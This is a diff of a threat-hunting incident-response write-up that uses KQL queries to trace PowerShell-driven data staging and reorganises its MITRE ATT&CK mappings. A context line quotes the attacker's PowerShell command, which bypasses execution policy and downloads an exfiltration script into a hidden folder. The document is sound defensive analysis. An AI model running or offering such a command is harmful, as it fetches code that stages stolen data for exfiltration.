@@ -22,6 +22,10 @@ DeviceProcessEvents
 | order by TimeGenerated
 ```
 
+**Relevant TTPs:**
+- **T1059.001**: Command and Scripting Interpreter: PowerShell
+- **T1105**: Ingress Tool Transfer
+
 ![ir1](https://github.com/user-attachments/assets/1fab327c-eb1c-465a-99d7-83ac5688ca46)
 
 This query detected the following suspicious command:
@@ -31,11 +35,6 @@ powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://r
 ```
 
 The command indicated that a PowerShell script (exfiltratedata.ps1) was downloaded from the internet to C:\ProgramData, a folder that is hidden by default on Windows. This suggests an attempt to conceal the file's presence and triggered further investigation.
-
-### Relevant MITRE ATT&CK Techniques
-- **T1059.001**: Command and Scripting Interpreter: PowerShell
-- **T1105**: Ingress Tool Transfer
-- **T1027**: Obfuscated Files or Information
 
 ### User Inquiry
 
@@ -52,11 +51,13 @@ DeviceProcessEvents
 | order by Timestamp
 ```
 
+**Corresponding TTPs:**
+- **T1059.001**: Command and Scripting Interpreter: PowerShell
+- **T1027**: Obfuscated Files or Information
+
 ![processquery](https://github.com/user-attachments/assets/e9197ad7-2365-4bbc-86fb-41a25c40ff57)
 
 **Findings:**
-
-**Note:** The placeholder [TIMESTAMP] represents generalized timestamps for repeated events. Refer to the screenshots for actual logs.
 
 | Timestamps                     | FileName         | FolderPath                                  | ProcessCommandLine                                        |
 |--------------------------------|------------------|--------------------------------------------|---------------------------------------------------------|
@@ -70,8 +71,6 @@ These logs confirmed the following sequence of events:
 2. The script installed 7-Zip silently using 7z2408-x64.exe.
 3. The installed 7-Zip (7z.exe) was used to compress sensitive data into ZIP files.
 
-This strongly indicated malicious intent to exfiltrate sensitive information.
-
 ### Network Events Analysis
 
 To identify any potential data exfiltration, I queried network events:
@@ -82,6 +81,10 @@ DeviceNetworkEvents
 | project Timestamp, ActionType, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessCommandLine
 | order by Timestamp
 ```
+
+**Corresponding TTPs:**
+- **T1105**: Ingress Tool Transfer
+- **T1041**: Exfiltration Over C2 Channel
 
 ![networkquery](https://github.com/user-attachments/assets/6fccbaf5-f771-4ba9-9805-e0baed7ed3de)
 
@@ -106,11 +109,15 @@ DeviceFileEvents
 | order by Timestamp desc
 ```
 
+**Corresponding TTPs:**
+- **T1027**: Obfuscated Files or Information
+- **T1560.001**: Archive Collected Data: Archive via Utility
+
 **Findings:**
 
 ![Filequery](https://github.com/user-attachments/assets/aba14b2e-9fbd-41aa-a33d-bfe771693a61)
 
-**Note:** The placeholder [TIMESTAMP] represents generalized timestamps for repeated events. Refer to the screenshots for actual logs.
+**Findings:**
 
 | Timestamps             | FileName                     | FolderPath                             | InitiatingProcessCommandLine                                          | ActionType |
 |--------------------------------|------------------------------|----------------------------------------|------------------------------------------------------------------------|------------|
@@ -161,7 +168,6 @@ These findings confirmed the repeated creation and renaming of ZIP files, consis
 ### Recommendations
 
 1. **Enhance Monitoring**:
-   - Note: PowerShell activity logging is already implemented, as evidenced by the alert triggered in this investigation.
    - Create detection rules for unauthorized archiving tools and large file transfers.
 
 2. **User Education**:
@@ -182,3 +188,4 @@ These findings confirmed the repeated creation and renaming of ZIP files, consis
 ## Closure
 
 The incident was successfully contained, eradicated, and the affected device fully recovered. Documentation has been updated with findings, actions taken, and recommendations. Lessons learned have been incorporated into the organization’s incident response playbooks to improve future response capabilities.
+
